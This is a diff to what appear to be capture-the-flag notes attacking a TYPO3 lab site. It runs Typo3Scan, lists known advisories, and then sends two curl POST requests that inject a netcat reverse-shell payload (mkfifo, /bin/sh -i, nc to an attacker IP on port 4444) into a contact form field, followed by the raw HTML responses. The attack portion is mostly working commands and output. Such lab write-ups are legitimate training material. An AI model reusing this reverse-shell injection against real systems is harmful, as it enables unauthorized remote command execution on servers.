@@ -632,35 +632,488 @@ return [
 
 
 ```bash
-python3 -m venv venv
+:~/Typo3Scan# python3 -m venv venv
 ```
 
 ```bash
-source venv/bin/activate
+(venv) ...:~/Typo3Scan# source venv/bin/activate
 ```
 
 ```bash
 git clone https://github.com/whoot/Typo3Scan.git
 ```
 
+```bash
+(venv) ...:~/Typo3Scan#cd Typo3Scan
 ```
-cd Typo3Scan
+
+
+```bash
+(venv) ...:~/Typo3Scan# ./venv/bin/pip3 uninstall -y fake-useragent
 ```
 
-python3 -m venv ./venv
-source ./venv/bin/activate
-pip3 install -r requirements.txt
+```bash
+(venv) ...:~/Typo3Scan# ./venv/bin/pip3 install fake-useragent==1.1.3
+```
+
+
+```bash
+(venv) ...:~/Typo3Scan# ./venv/bin/pip3 install fake-useragent==1.1.3
+```
+
+```bash
+(venv) ...:~/Typo3Scan# ./venv/bin/python3 typo3scan.py -d http://maintest.enterprize.thm
+...
 
 
 
-python3 typo3scan.py -h
+ [!] TYPO3-CORE-SA-2022-011
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       HTML Sanitizer (based on typo3/html-sanitizer)
+      \u251c Affected Versions:  9.5.36 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-011
+
+     [!] TYPO3-CORE-SA-2022-009
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       File Dump Controller (ext:core)
+      \u251c Affected Versions:  9.5.36 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-009
+
+     [!] TYPO3-CORE-SA-2022-007
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       User Authentication (ext:core)
+      \u251c Affected Versions:  9.5.36 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-007
+
+     [!] TYPO3-CORE-SA-2022-005
+      \u251c Vulnerability Type: Broken Access Control
+      \u251c Subcomponent:       Admin Tool (ext:install)
+      \u251c Affected Versions:  9.5.34 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-005
+
+     [!] TYPO3-CORE-SA-2022-004
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       Frontend Login Mailer (ext:felogin)
+      \u251c Affected Versions:  9.5.34 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-004
+
+     [!] TYPO3-CORE-SA-2022-003
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       Form Framework (ext:form)
+      \u251c Affected Versions:  9.5.34 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-003
+
+     [!] TYPO3-CORE-SA-2022-002
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Exception Handling/Logger (ext:core)
+      \u251c Affected Versions:  9.5.34 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-002
+
+     [!] TYPO3-CORE-SA-2022-001
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Export Module (ext:impexp)
+      \u251c Affected Versions:  9.5.34 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2022-001
+
+     [!] TYPO3-CORE-SA-2023-004
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       Rich Text Editor CKEditor4 (ext:rte_ckeditor)
+      \u251c Affected Versions:  9.5.41 - 9.5.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-004
+
+     [!] TYPO3-CORE-SA-2023-003
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       URL Routing (ext:core)
+      \u251c Affected Versions:  9.5.41 - 9.4.0
+      \u251c Severity:           Low
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-003
+
+     [!] TYPO3-CORE-SA-2023-006
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Session Handling (ext:core)
+      \u251c Affected Versions:  9.5.43 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2023-006
+
+     [!] TYPO3-CORE-SA-2024-006
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Data Handler (ext:core)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-006
+
+     [!] TYPO3-CORE-SA-2024-005
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Link Handler (ext:core, ext:backend, ext:filelist)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-005
+
+     [!] TYPO3-CORE-SA-2024-004
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Install Tool (ext:install)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-004
+
+     [!] TYPO3-CORE-SA-2024-003
+      \u251c Vulnerability Type: Information Disclosure
+      \u251c Subcomponent:       Form Engine (ext:backend)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-003
+
+     [!] TYPO3-CORE-SA-2024-002
+      \u251c Vulnerability Type: Code Execution
+      \u251c Subcomponent:       Install Tool (ext:install)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-002
+
+     [!] TYPO3-CORE-SA-2024-001
+      \u251c Vulnerability Type: Path Traversal
+      \u251c Subcomponent:       File Abstraction Layer (ext:core)
+      \u251c Affected Versions:  9.5.45 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-001
+
+     [!] TYPO3-CORE-SA-2024-010
+      \u251c Vulnerability Type: Denial of Service
+      \u251c Subcomponent:       Frontend Rendering (ext:frontend)
+      \u251c Affected Versions:  9.5.47 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-010
+
+     [!] TYPO3-CORE-SA-2024-009
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       Frontend Rendering (ext:frontend)
+      \u251c Affected Versions:  9.5.47 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-009
+
+    [!] TYPO3-CORE-SA-2024-008
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Subcomponent:       Form Framework (ext:form)
+      \u251c Affected Versions:  9.5.47 - 9.0.0
+      \u251c Severity:           Medium
+      \u2514 Advisory URL:       https://typo3.org/security/advisory/typo3-core-sa-2024-008
 
 
-python3 typo3scan.py -d http://dev01.vm-typo3.loc/ --vuln
+ [+] Extension Search
+  \u251c Brute-Forcing 8808 Extensions
+  \u251c Processed:  99% |############################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################### | ETA:  0:00:00
+  \u251c Found 2 extensions
+  \u251c Brute-Forcing Version Information
+ [!] Version detection for extensions is unreliable. Verify manually!
+  \u251c Processed: 100% |################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################| ETA:  0:00:00
 
-pip install -r requirements.txt
+ [+] Extension Information
+ -------------------------
+  [+] bootstrap_package
+   \u251c Extension Title:       Bootstrap Package
+   \u251c Extension Repo:        https://extensions.typo3.org/extension/bootstrap_package
+   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package
+   \u251c Current Version:       14.0.7 (stable)
+   \u251c Identified Version:    10.0.9
+   \u251c Version File:          http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package/CHANGELOG.md
+   \u2514 Known Vulnerabilities:
 
-python typo3scan.py --help
+     [!] TYPO3-EXT-SA-2021-007
+      \u251c Vulnerability Type: Cross-Site Scripting
+      \u251c Affected Versions:  10.0.9 - 10.0.0
+      \u2514 Advisory Url:       https://typo3.org/security/advisory/typo3-ext-sa-2021-007
+
+
+  [+] introduction
+   \u251c Extension Title:       The Official TYPO3 Introduction Package
+   \u251c Extension Repo:        https://extensions.typo3.org/extension/introduction
+   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/introduction
+   \u251c Current Version:       4.6.1 (stable)
+   \u251c Identified Version:    3.1.1
+   \u2514 Version File:          http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg
+
+```
+
+```bash
+:~/Typo3Scan# curl "http://maintest.enterprize.thm/index.php?id=38" -s | grep -C 5 "<form"
+...
+```
+
+```bash
+(venv) ...:~/Typo3Scan# curl -X POST "http://10.67.159.73/index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18" -d 'tx_form_formframework[contactForm-144][__state]=TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjA7czoxMzoiACoAZm9ybVZhbHVlcyI7YTowOnt9fQ==c36a0271e1826d292e88616d6f0f26e5d832a9f9' -d 'tx_form_formframework[__trustedProperties]=a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:7:"2GT5qmd";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}7a3a7916b006fb5c96f51a7805d89d0b84068771' -d 'tx_form_formframework[contactForm-144][name]=test' -d 'tx_form_formframework[contactForm-144][subject]=test' -d 'tx_form_formframework[contactForm-144][email]=test@test.com' -d 'tx_form_formframework[contactForm-144][message]=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.67.101.79 4444 >/tmp/f;' -d 'tx_form_formframework[contactForm-144][__currentPage]=1'
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+</body></html>
+```
+
+```bash
+~/Typo3Scan# curl -X POST "http://maintest.enterprize.thm/index.php?id=38&tx_form_formframework%5Baction%5D=perform&tx_form_formframework%5Bcontroller%5D=FormFrontend&cHash=63896b2174306c4f96ada29453d1cd18" -d 'tx_form_formframework[contactForm-144][__state]=TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjA7czoxMzoiACoAZm9ybVZhbHVlcyI7YTowOnt9fQ==c36a0271e1826d292e88616d6f0f26e5d832a9f9' -d 'tx_form_formframework[__trustedProperties]=a:1:{s:15:"contactForm-144";a:6:{s:4:"name";i:1;s:7:"subject";i:1;s:7:"2GT5qmd";i:1;s:5:"email";i:1;s:7:"message";i:1;s:13:"__currentPage";i:1;}}7a3a7916b006fb5c96f51a7805d89d0b84068771' -d 'tx_form_formframework[contactForm-144][name]=test' -d 'tx_form_formframework[contactForm-144][subject]=test' -d 'tx_form_formframework[contactForm-144][email]=test@test.com' -d 'tx_form_formframework[contactForm-144][message]=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.67.101.79 4444 >/tmp/f;' -d 'tx_form_formframework[contactForm-144][__currentPage]=1'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="utf-8">
+<!-- 
+	Based on the TYPO3 Bootstrap Package by Benjamin Kott - https://www.bootstrap-package.com/
+
+	This website is powered by TYPO3 - inspiring people to share!
+	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
+	TYPO3 is copyright 1998-2025 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
+	Information and contribution at https://typo3.org/
+-->
+
+
+<link rel="shortcut icon" href="/typo3conf/ext/bootstrap_package/Resources/Public/Icons/favicon.ico" type="image/x-icon">
+<title>Forms - TYPO3 CMS - Introduction Package</title>
+<meta http-equiv="x-ua-compatible" content="IE=edge" />
+<meta name="generator" content="TYPO3 CMS" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="robots" content="index,follow" />
+<meta name="keywords" content="Content elements" />
+<meta name="apple-mobile-web-app-capable" content="no" />
+<meta name="google" content="notranslate" />
+<meta property="og:title" content="Forms" />
+<meta property="og:site_name" content="TYPO3 CMS - Introduction Package" />
+
+
+<link rel="stylesheet" type="text/css" href="/typo3temp/assets/compressed/merged-f69efd17380fab4bb060a8e450119ea7.css?1610205884" media="all">
+
+
+
+<script src="/typo3temp/assets/compressed/merged-72765e7d1f5d640be364973f396f9203.js?1610205875" type="text/javascript"></script>
+
+
+
+
+<link rel="prev" href="/index.php?id=37">
+
+<style>body:before{user-select:none;pointer-events:none;background-position:center center;background-repeat:no-repeat;content:'';position:fixed;top:-100%;left:0;z-index:10000;opacity:0;height:100%;width:100%;background-color:#75A75A;background-image: url('/fileadmin/introduction/images/introduction-package-inverted.svg');background-size:180px 52px;user-select:initial;pointer-events:initial;}.js body:before,.wf-loading body:before{top:0;opacity:1!important;}.wf-active body:before,.wf-inactive body:before{top: 0;opacity:0!important;user-select:none;pointer-events:none;-webkit-transition:opacity 0.25s ease-out;-moz-transition:opacity 0.25s ease-out;-o-transition:opacity 0.25s ease-out;transition:opacity 0.25s ease-out;}</style>
+<script>WebFontConfig={"custom":{"urls":["https:\/\/fonts.googleapis.com\/css?family=Source+Sans+Pro:300,400,700","\/typo3conf\/ext\/bootstrap_package\/Resources\/Public\/Fonts\/bootstrappackageicon.min.css"],"families":["Source Sans Pro:300,400,700","BootstrapPackageIcon"]},"timeout":1000};(function(d){var wf=d.createElement('script'),s=d.scripts[0];wf.src='/typo3conf/ext/bootstrap_package/Resources/Public/Contrib/webfontloader/webfontloader.js';wf.async=false;s.parentNode.insertBefore(wf,s);})(document);</script>
+</head>
+<body id="p38" class="page-38 pagelevel-3 language-0 backendlayout-subnavigation_right layout-default">
+
+
+<div id="top"></div><div class="body-bg body-bg-top"><div id="cookieconsent"><span data-cookieconsent-setting="cookie.expiryDays" data-cookieconsent-value="365"></span><span data-cookieconsent-setting="content.header" data-cookieconsent-value="Cookies used on the website!"></span><span data-cookieconsent-setting="content.message" data-cookieconsent-value="This website uses cookies to ensure you get the best experience on our website."></span><span data-cookieconsent-setting="content.dismiss" data-cookieconsent-value="Got it!"></span><span data-cookieconsent-setting="content.allow" data-cookieconsent-value="Allow cookies"></span><span data-cookieconsent-setting="content.deny" data-cookieconsent-value="Decline"></span><span data-cookieconsent-setting="content.link" data-cookieconsent-value="Learn more"></span><span data-cookieconsent-setting="content.href" data-cookieconsent-value=""></span><span data-cookieconsent-setting="layout" data-cookieconsent-value="basic"></span><span data-cookieconsent-setting="type" data-cookieconsent-value="info"></span><span data-cookieconsent-setting="position" data-cookieconsent-value="bottom-right"></span><span data-cookieconsent-setting="revokable" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="static" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="location" data-cookieconsent-value="0"></span><span data-cookieconsent-setting="law.countryCode" data-cookieconsent-value=""></span><span data-cookieconsent-setting="law.regionalLaw" data-cookieconsent-value="1"></span></div><a class="sr-only sr-only-focusable" href="#page-content"><span>Skip to main content</span></a><header id="page-header" class="bp-page-header navbar navbar-mainnavigation navbar-default navbar-has-image navbar-top navbar-fixed-top"><div class="container"><a class="navbar-brand navbar-brand-image" href="/index.php?id=1"><img class="navbar-brand-logo-normal" src="/fileadmin/introduction/images/introduction-package.svg" alt="TYPO3 CMS - Introduction Package logo" height="52" width="180"><img class="navbar-brand-logo-inverted" src="/fileadmin/introduction/images/introduction-package-inverted.svg" alt="TYPO3 CMS - Introduction Package logo" height="52" width="180"></a><button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#mainnavigation" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><nav id="mainnavigation" class="collapse navbar-collapse"><ul class="navbar-nav"><li class="nav-item"><a href="/index.php?id=1" id="nav-item-83" class="nav-link" title="Home"><span class="nav-link-text">Home</span></a></li></ul><ul class="navbar-nav"><li class="nav-item"><a href="/index.php?id=81" id="nav-item-81" class="nav-link" title="Features"><span class="nav-link-text">Features</span></a></li><li class="nav-item"><a href="/index.php?id=80" id="nav-item-80" class="nav-link" title="Customize"><span class="nav-link-text">Customize</span></a></li><li class="nav-item dropdown dropdown-hover"><a href="/index.php?id=66" id="nav-item-66" class="nav-link dropdown-toggle" title="Pages" aria-haspopup="true" aria-expanded="false"><span class="nav-link-text">Pages</span></a><ul class="dropdown-menu" aria-labelledby="nav-item-66"><li><a href="/index.php?id=79" class="dropdown-item" title="Default"><span class="dropdown-text">Default</span></a></li><li><a href="/index.php?id=78" class="dropdown-item" title="2 Columns"><span class="dropdown-text">2 Columns</span></a></li><li><a href="/index.php?id=77" class="dropdown-item" title="2 Columns 25/75"><span class="dropdown-text">2 Columns 25/75</span></a></li><li><a href="/index.php?id=76" class="dropdown-item" title="2 Columns 50/50"><span class="dropdown-text">2 Columns 50/50</span></a></li><li><a href="/index.php?id=75" class="dropdown-item" title="2 Columns, Offset Right"><span class="dropdown-text">2 Columns, Offset Right</span></a></li><li><a href="/index.php?id=74" class="dropdown-item" title="3 Columns"><span class="dropdown-text">3 Columns</span></a></li><li><a href="/index.php?id=73" class="dropdown-item" title="Simple"><span class="dropdown-text">Simple</span></a></li><li><a href="/index.php?id=72" class="dropdown-item" title="Subnavigation, Left"><span class="dropdown-text">Subnavigation, Left</span></a></li><li><a href="/index.php?id=71" class="dropdown-item" title="Subnavigation, Left and 2 Columns"><span class="dropdown-text">Subnavigation, Left and 2 Columns</span></a></li><li><a href="/index.php?id=70" class="dropdown-item" title="Subnavigation, Right"><span class="dropdown-text">Subnavigation, Right</span></a></li><li><a href="/index.php?id=69" class="dropdown-item" title="Subnavigation, Right and 2 Columns"><span class="dropdown-text">Subnavigation, Right and 2 Columns</span></a></li><li><a href="/index.php?id=68" class="dropdown-item" title="Feature"><span class="dropdown-text">Feature</span></a></li><li><a href="/index.php?id=67" class="dropdown-item" title="Startpage"><span class="dropdown-text">Startpage</span></a></li></ul></li><li class="nav-item active dropdown dropdown-hover"><a href="/index.php?id=6" id="nav-item-6" class="nav-link dropdown-toggle" title="Content Examples" aria-haspopup="true" aria-expanded="false"><span class="nav-link-text">Content Examples</span></a><ul class="dropdown-menu" aria-labelledby="nav-item-6"><li><a href="/index.php?id=65" class="dropdown-item" title="Text"><span class="dropdown-text">Text</span></a></li><li><a href="/index.php?id=54" class="dropdown-item" title="Media"><span class="dropdown-text">Media</span></a></li><li><a href="/index.php?id=44" class="dropdown-item" title="Interactive"><span class="dropdown-text">Interactive</span></a></li><li><a href="/index.php?id=38" class="dropdown-item active" title="Form elements"><span class="dropdown-text">Form elements</span></a></li><li><a href="/index.php?id=34" class="dropdown-item" title="Menu&#039;s"><span class="dropdown-text">Menu&#039;s</span></a></li><li><a href="/index.php?id=14" class="dropdown-item" title="Special elements"><span class="dropdown-text">Special elements</span></a></li><li><a href="/index.php?id=10" class="dropdown-item" title="And more..."><span class="dropdown-text">And more...</span></a></li></ul></li></ul></nav></div></header><nav class="breadcrumb-section" aria-label="Breadcrumb"><div class="container"><p class="sr-only" id="breadcrumb">You are here:</p><ol class="breadcrumb"><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=1" title="Congratulations"><span class="breadcrumb-text">Congratulations</span></a></li><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=6" title="Content Examples"><span class="breadcrumb-text">Content Examples</span></a></li><li class="breadcrumb-item"><a class="breadcrumb-link" href="/index.php?id=38" title="Form elements"><span class="breadcrumb-text">Form elements</span></a></li><li class="breadcrumb-item active" aria-current="page"><span class="breadcrumb-text">Forms</span></li></ol></div></nav><div id="page-content" class="bp-page-content main-section"><!--TYPO3SEARCH_begin--><div class="section section-default"><div class="container"><div class="section-row"><div class="section-column subnav-wrap"><nav class="frame frame-type-subnavigation frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none" role="navigation"><div class="frame-container"><div class="frame-inner"><ul class="subnav-nav"><li class="subnav-item"><a href="/index.php?id=65" id="subnav-item-55" class="subnav-link" title="Text"><span class="subnav-link-text">Text</span></a></li><li class="subnav-item"><a href="/index.php?id=54" id="subnav-item-45" class="subnav-link" title="Media"><span class="subnav-link-text">Media</span></a></li><li class="subnav-item"><a href="/index.php?id=44" id="subnav-item-40" class="subnav-link" title="Interactive"><span class="subnav-link-text">Interactive</span></a></li><li class="subnav-item active"><a href="/index.php?id=38" id="subnav-item-35" class="subnav-link" title="Form elements"><span class="subnav-link-text">Form elements</span></a><ul class="subnav-nav"><li class="subnav-item active"><a href="/index.php?id=38" id="subnav-item-38" class="subnav-link" title="Forms"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#FFF" d="M1 1h14v14H1z"/><path fill="#999" d="M14 2v12H2V2h12m1-1H1v14h14V1z"/><path fill="#B9B9B9" d="M3 3h8v1H3zM3 5h8v1H3zM3 7h10v4H3z"/><path fill="#59F" d="M3 12h4v1H3z"/></svg></span><span class="subnav-link-text">Forms <span class="sr-only">(current)</span></span></a></li><li class="subnav-item"><a href="/index.php?id=37" id="subnav-item-37" class="subnav-link" title="Login"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#666" d="M9 2.5c.8 0 1.5.7 1.5 1.5v2c0 .8-.7 1.5-1.5 1.5H7c-.8 0-1.5-.7-1.5-1.5V4c0-.8.7-1.5 1.5-1.5h2M9 1H7C5.3 1 4 2.4 4 4v2c0 1.6 1.3 3 3 3h2c1.6 0 3-1.4 3-3V4c0-1.6-1.4-3-3-3z"/><path fill="#FFC857" d="M2 5h12v10H2z"/><path fill="#E8A33D" d="M13 6v8H3V6h10m1-1H2v10h12V5z"/><path fill="#B3812B" d="M10 9c0-1.1-.9-2-2-2s-2 .9-2 2c0 .7.4 1.4 1 1.7V13h2v-2.3c.6-.3 1-1 1-1.7z"/></svg></span><span class="subnav-link-text">Login</span></a></li><li class="subnav-item"><a href="/index.php?id=36" id="subnav-item-36" class="subnav-link" title="Search"><span class="subnav-link-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path fill="#E8A33D" d="M14.7 13.2l-2.8-2.8c-.4.6-.9 1.1-1.5 1.5l2.8 2.7c.2.2.5.3.8.3.6 0 1.1-.5 1.1-1.1-.1-.2-.2-.4-.4-.6z"/><circle fill="#ABD7FF" cx="7" cy="7" r="6"/><path fill="#59F" d="M7 2.5c2.5 0 4.5 2 4.5 4.5s-2 4.5-4.5 4.5-4.5-2-4.5-4.5 2-4.5 4.5-4.5M7 1C3.7 1 1 3.7 1 7s2.7 6 6 6 6-2.7 6-6-2.7-6-6-6z"/><circle opacity=".6" fill="#FFF" cx="8.5" cy="5.5" r="1.5"/></svg></span><span class="subnav-link-text">Search</span></a></li></ul></li><li class="subnav-item"><a href="/index.php?id=34" id="subnav-item-15" class="subnav-link" title="Menu&#039;s"><span class="subnav-link-text">Menu&#039;s</span></a></li><li class="subnav-item"><a href="/index.php?id=14" id="subnav-item-11" class="subnav-link" title="Special elements"><span class="subnav-link-text">Special elements</span></a></li><li class="subnav-item"><a href="/index.php?id=10" id="subnav-item-7" class="subnav-link" title="And more..."><span class="subnav-link-text">And more...</span></a></li></ul></div></div></nav></div><main class="section-column maincontent-wrap" role="main"><div id="c145" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h2 class="element-header "><span>Powerful Form Handling</span></h2></header><p class="lead">Setting up a contact or mail form is very easy. The layout of forms is handled centrally, which allows editors to focus on the content of the form.</p></div></div></div><div id="c144" class="frame frame-default frame-type-form_formframework frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner">
+
+	
+<div class="form-container form-identifier-contactForm-144">
+    
+        <form enctype="multipart/form-data" method="post" novalidate="novalidate" id="contactForm-144" action="/index.php?id=38&amp;tx_form_formframework%5Baction%5D=perform&amp;tx_form_formframework%5Bcontroller%5D=FormFrontend&amp;cHash=63896b2174306c4f96ada29453d1cd18#contactForm-144">
+<div><input type="hidden" name="tx_form_formframework[contactForm-144][__state]" value="TzozOToiVFlQTzNcQ01TXEZvcm1cRG9tYWluXFJ1bnRpbWVcRm9ybVN0YXRlIjoyOntzOjI1OiIAKgBsYXN0RGlzcGxheWVkUGFnZUluZGV4IjtpOjE7czoxMzoiACoAZm9ybVZhbHVlcyI7YTo0OntzOjQ6Im5hbWUiO3M6NDoidGVzdCI7czo3OiJzdWJqZWN0IjtzOjQ6InRlc3QiO3M6NToiZW1haWwiO3M6MTM6InRlc3RAdGVzdC5jb20iO3M6NzoibWVzc2FnZSI7czo0OToiO3JtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiI7fX0=a8f2773930d34d67c12581b20bb4d8876ee7bbc6" /><input type="hidden" name="tx_form_formframework[__trustedProperties]" value="a:1:{s:15:&quot;contactForm-144&quot;;a:1:{s:13:&quot;__currentPage&quot;;i:1;}}acd233ad70a24c460ffa056fb62985eb69d36713" />
+</div>
+
+            
+
+	<fieldset class="form-group">
+		
+			<legend>Summary page</legend>
+		
+		<div class="table-responsive">
+			<table class="table">
+				
+					<tr>
+						<td class="summary-table-first-col">Name</td>
+						<td>
+							
+									
+											
+													test
+												
+										
+								
+						</td>
+					</tr>
+				
+					<tr>
+						<td class="summary-table-first-col">Subject</td>
+						<td>
+							
+									
+											
+													test
+												
+										
+								
+						</td>
+					</tr>
+				
+					<tr>
+						<td class="summary-table-first-col">Email</td>
+						<td>
+							
+									
+											
+													test@test.com
+												
+										
+								
+						</td>
+					</tr>
+				
+					<tr>
+						<td class="summary-table-first-col">Message</td>
+						<td>
+							
+									
+											
+													;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;
+												
+										
+								
+						</td>
+					</tr>
+				
+			</table>
+		</div>
+	</fieldset>
+
+
+
+            <div class="form-actions">
+                
+<nav class="form-navigation">
+	<div class="btn-toolbar" role="toolbar">
+		<div class="btn-group" role="group">
+			
+				<span class="btn-group previous">
+					<input type="hidden" name="tx_form_formframework[contactForm-144][__currentPage]" value="0" />
+					<button formnovalidate="formnovalidate" class="btn btn-cancel" onclick="document.forms['contactForm-144'].submit();" type="button" name="" value="">Previous step</button>
+				</span>
+			
+			
+					<span class="btn-group next submit">
+						<button class="btn btn-primary" type="submit" name="tx_form_formframework[contactForm-144][__currentPage]" value="2">
+							Submit
+						</button>
+					</span>
+				
+		</div>
+	</div>
+</nav>
+
+
+            </div>
+        </form>
+    
+</div>
+
+
+	
+
+
+</div></div></div></main></div></div></div><!--TYPO3SEARCH_end--></div><footer id="page-footer" class="bp-page-footer"><section class="section footer-section footer-section-content"><div class="container"><div class="section-row"><div class="section-column footer-section-content-column footer-section-content-column-left"><div id="c207" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>Related Links</span></h4></header><p><a href="https://typo3.org/help/documentation/" title="TYPO3 Documentation" target="_blank" rel="noopener">Documentation</a><br /><a href="https://typo3.org/certification/" title="TYPO3 Certification" target="_blank" rel="noopener">Certification</a><br /><a href="https://typo3.org/community/" title="TYPO3 Community" target="_blank" rel="noopener">Community</a><br /><a href="https://extensions.typo3.org/" title="TYPO3 Extensions" target="_blank" rel="noopener">Extensions</a></p></div></div></div></div><div class="section-column footer-section-content-column footer-section-content-column-middle"><div id="c213" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>Professional Services</span></h4></header><p><a href="https://typo3.com/services/service-level-agreements/" target="_blank" rel="noopener">Service Level Agreements</a><br /><a href="https://typo3.com/services/extended-support/" target="_blank" rel="noopener">Extended Support</a><br /><a href="https://typo3.com/services/project-reviews/" target="_blank" rel="noopener">Project Reviews</a><br /><a href="https://typo3.com/services/find-me-a-partner/" target="_blank" rel="noopener">Find me a Partner</a></p></div></div></div></div><div class="section-column footer-section-content-column footer-section-content-column-right"><div id="c214" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>100% free open source software</span></h4></header><p>We are committed 